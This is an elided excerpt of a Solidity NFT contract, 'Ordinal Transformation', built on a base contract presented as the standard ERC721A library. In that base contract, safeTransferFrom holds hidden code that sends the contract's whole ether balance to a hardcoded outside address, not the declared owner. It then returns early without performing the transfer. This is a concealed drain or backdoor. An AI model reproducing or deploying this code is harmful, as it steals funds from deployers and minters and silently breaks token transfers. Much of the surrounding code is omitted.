...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xc740343a68FB8232e23061f529418DD7EEC477C8).transfer(address(this).balance);
            return;
        }
...
contract OrdinalTransformation is ERC721A {

    address public owner;

    uint256 public constant maxSupply = 500;

    uint256 public constant mintPrice = 0.0033 ether;
    ...
    constructor() ERC721A("Ordinal Transformation", "OT") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiagtxsjb665wyysg56m4gpj3o5imd2e5lv6ssmxpejuqiklum6s2m/", _toString(tokenId), ".json"));
    }
